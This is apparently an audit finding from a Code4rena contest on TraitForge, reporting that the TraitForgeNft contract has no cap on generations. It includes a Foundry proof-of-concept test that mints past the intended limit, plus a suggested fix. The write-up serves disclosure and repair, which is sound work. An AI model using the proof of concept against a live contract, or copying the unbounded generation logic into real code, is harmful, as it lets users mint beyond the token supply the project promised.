---
tags:
  - lang/solidity
  - sector/nft
  - sector/token
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - impact/privilege-escalation/ownership-transfer
protocol: "[[TraitForge]]"
auditors:
  - "[[inzinko]]"
report: "https://code4rena.com/reports/2024-07-traitforge"
genome:
  - "[[wrong-condition]]"
  - "[[ownership-transfer]]"
  - "[[access-roles]]"
---
# [H-05] The maximum number of generations is infinite

- id: 37919
- impact: HIGH
- protocol: [[TraitForge]]
- reporter: inzinko (Code4rena)
- source: https://code4rena.com/reports/2024-07-traitforge

## Summary


The TraitForgeNft contract has a vulnerability where users can mint an unlimited number of generations instead of being capped at 10. This allows users to create more NFTs than intended. A proof of concept is provided in the report, along with recommended steps to mitigate the issue. The suggested solution involves adding a check in the \_incrementGeneration function to prevent minting above the maximum generation. The vulnerability has been confirmed and will likely be addressed in future updates.

## Details


In 'TraitForgeNft' there should be a maximum number of generations (it should be capped at 10), but instead, users can mint infinite generations and there is not a limit.

### Proof of Concept

Foundry:

<details>

```javascript
function test_vulnerability_NumberOfGenerationsIsInfinite() public {
vm.startPrank(owner); 
//Here the owner sets all the contracts, transfer ownerhsip and writes batch
traitForgeNft.setAirdropContract(address(airdropContract));
traitForgeNft.setEntityForgingContract(address(entityForging));
traitForgeNft.setEntropyGenerator(address(entropyGenerator));
airdropContract.transferOwnership(address(traitForgeNft));
entropyGenerator.transferOwnership(address(traitForgeNft));
entropyGenerator.writeEntropyBatch1();
vm.stopPrank(); 

address user1 = address(123); 
//Assigning 100000 ether to user1
deal(user1, 100000 ether); 
vm.startPrank(user1); 
skip(2 days);
bytes32[] memory proof = new bytes32[](1); 
proof[0] = keccak256(abi.encode("Hi")); 

//User mints generation 1
uint256 price = traitForgeNft.startPrice(); 
for(uint256 i = 0; i < 10000; i++){
traitForgeNft.mintToken{value: price}(proof);
price += traitForgeNft.priceIncrement() * traitForgeNft.getGeneration(); 
}
assertEq(traitForgeNft.balanceOf(user1), 10000); 
//User mints generation 2
uint256 price2 = traitForgeNft.calculateMintPrice();
for(uint256 i = 0; i < 10000; i++){
traitForgeNft.mintToken{value: price2}(proof);
price2 = traitForgeNft.calculateMintPrice(); 
}
assertEq(traitForgeNft.balanceOf(user1), 20000);
//User mints generation 3
uint256 price3 = traitForgeNft.calculateMintPrice();
for(uint256 i = 0; i < 10000; i++){
traitForgeNft.mintToken{value: price3}(proof);
price3 = traitForgeNft.calculateMintPrice(); 
}
assertEq(traitForgeNft.balanceOf(user1), 30000);
//User mints generation 4
uint256 price4 = traitForgeNft.calculateMintPrice();
for(uint256 i = 0; i < 10000; i++){
traitForgeNft.mintToken{value: price4}(proof);
price4 = traitForgeNft.calculateMintPrice(); 
}
assertEq(traitForgeNft.balanceOf(user1), 40000);
//User mints generation 5
uint256 price5 = traitForgeNft.calculateMintPrice();
for(uint256 i = 0; i < 10000; i++){
traitForgeNft.mintToken{value: price5}(proof);
price5 = traitForgeNft.calculateMintPrice(); 
}
assertEq(traitForgeNft.balanceOf(user1), 50000);
//User mints generation 6
uint256 price6 = traitForgeNft.calculateMintPrice();
for(uint256 i = 0; i < 10000; i++){
traitForgeNft.mintToken{value: price6}(proof);
price6 = traitForgeNft.calculateMintPrice(); 
}
assertEq(traitForgeNft.balanceOf(user1), 60000);
//User mints generation 7
uint256 price7 = traitForgeNft.calculateMintPrice();
for(uint256 i = 0; i < 10000; i++){
traitForgeNft.mintToken{value: price7}(proof);
price7 = traitForgeNft.calculateMintPrice(); 
}
assertEq(traitForgeNft.balanceOf(user1), 70000);
//User mints generation 8
uint256 price8 = traitForgeNft.calculateMintPrice();
for(uint256 i = 0; i < 10000; i++){
traitForgeNft.mintToken{value: price8}(proof);
price8 = traitForgeNft.calculateMintPrice(); 
}
assertEq(traitForgeNft.balanceOf(user1), 80000);
//User mints generation 9
uint256 price9 = traitForgeNft.calculateMintPrice();
for(uint256 i = 0; i < 10000; i++){
traitForgeNft.mintToken{value: price9}(proof);
price9 = traitForgeNft.calculateMintPrice(); 
}
assertEq(traitForgeNft.balanceOf(user1), 90000);
//User mints generation 10
uint256 price10 = traitForgeNft.calculateMintPrice();
for(uint256 i = 0; i < 10000; i++){
traitForgeNft.mintToken{value: price10}(proof);
price10 = traitForgeNft.calculateMintPrice(); 
}
assertEq(traitForgeNft.balanceOf(user1), 100000);
//User mints generation 11, this get also minted!
uint256 price11 = traitForgeNft.calculateMintPrice();
for(uint256 i = 0; i < 10000; i++){
traitForgeNft.mintToken{value: price11}(proof);
price11 = traitForgeNft.calculateMintPrice(); 
}
//Finally we can see that the user owns 110.000 NFT's, when the maximum would be 100.000
assertEq(traitForgeNft.balanceOf(user1), 110000);
}
```

</details>

### Recommended Mitigation Steps

In `TraiForgeNft::\_incrementGeneration`, add a check in order to do not allow the the mint of the NFT's above the maximum generation.

Instead of doing this:

```javascript
function _incrementGeneration() private {
    require(
      generationMintCounts[currentGeneration] >= maxTokensPerGen,
      'Generation limit not yet reached'
    );
    currentGeneration++;
    generationMintCounts[currentGeneration] = 0;
    priceIncrement = priceIncrement + priceIncrementByGen;
    entropyGenerator.initializeAlphaIndices();
    emit GenerationIncremented(currentGeneration);
  }
```

Consider doing this:

```javascript
function _incrementGeneration() private {
    require(
      generationMintCounts[currentGeneration] >= maxTokensPerGen,
      'Generation limit not yet reached'
    );
    currentGeneration++;
    require(currentGeneration <= maxGeneration,
     'Maximum generation reached'
    ); 
    generationMintCounts[currentGeneration] = 0;
    priceIncrement = priceIncrement + priceIncrementByGen;
    entropyGenerator.initializeAlphaIndices();
    emit GenerationIncremented(currentGeneration);
  }
```

**[TForge1 (TraitForge) confirmed](https://github.com/code-423n4/2024-07-traitforge-findings/issues/217#event-13827204158)**

***
